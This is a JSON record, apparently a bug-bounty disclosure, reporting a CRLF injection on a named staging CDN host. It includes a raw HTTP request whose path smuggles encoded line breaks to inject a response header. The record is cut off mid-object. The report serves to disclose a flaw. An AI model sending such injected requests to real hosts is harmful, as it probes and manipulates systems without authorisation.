    {
      "id": 21697,
      "category": "team",
      "content": "### Summary\nCRLF Injection - `http://stage-static-cdn.mackeeper.com/`\n\n### Steps To Reproduce\nIn the rawRequest we have added `'%0D%0Avirus:%20value'`\nIn Burp Repeater copy and paste the below rawRequest\nNotice the response with header added\n\n```\n------rawRequest----------\nGET /%0D%0Avirus:%20value HTTP/1.1\nConnection: keep-alive\nAccept: /\nAccept-Encoding: gzip,deflate\nHost: stage-static-cdn.mackeeper.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\n\n------rawRequest----------\n```",
      "updated_at": "2020-05-15T06:33:02.620Z",
